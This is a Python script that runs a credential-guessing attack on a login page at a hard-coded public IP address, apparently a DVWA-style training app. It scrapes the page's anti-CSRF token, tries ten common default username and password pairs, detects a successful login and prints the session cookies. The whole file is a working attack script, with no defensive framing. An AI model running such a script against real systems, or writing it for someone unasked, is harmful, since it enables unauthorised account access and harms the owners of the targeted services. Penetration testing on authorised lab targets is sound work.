
import requests
import re

# URL
base_url = "http://31.97.117.123"
login_url = f"{base_url}/login.php"

# Common credentials to try
credentials = [
    ("admin", "admin"),
    ("admin", "password"),
    ("user", "user"),
    ("admin", "12345"),
    ("user", "password"),
    ("test", "test"),
    ("admin", "admin123"),
    ("root", "root"),
    ("administrator", "admin"),
    ("guest", "guest"),
]

session = requests.Session()

# First, get the login page to extract the user_token
response = session.get(login_url)
token_match = re.search(r"user_token'? value='([a-f0-9]+)'", response.text)

if token_match:
    user_token = token_match.group(1)
    print(f"[*] Found user_token: {user_token}")
else:
    print("[!] Could not find user_token")
    exit(1)

attempt = 0
for username, password in credentials:
    attempt += 1
    print(f"\n[Attempt {attempt}] Trying {username}:{password}")
    
    # Prepare login data
    data = {
        "username": username,
        "password": password,
        "user_token": user_token,
        "Login": "Login"
    }
    
    # Attempt login
    response = session.post(login_url, data=data, allow_redirects=True)
    
    # Check if login was successful
    if "Welcome" in response.text or "Logout" in response.text or "index.php" in response.url:
        print(f"[+] SUCCESS! Credentials found: {username}:{password}")
        print(f"[+] Redirected to: {response.url}")
        break
    elif "Login failed" in response.text or "incorrect" in response.text.lower():
        print(f"[-] Failed login")
    else:
        print(f"[?] Unknown response")
    
    if attempt >= 10:
        print("\n[!] Reached 10 attempts limit")
        break

print("\n[*] Session cookies:", session.cookies.get_dict())

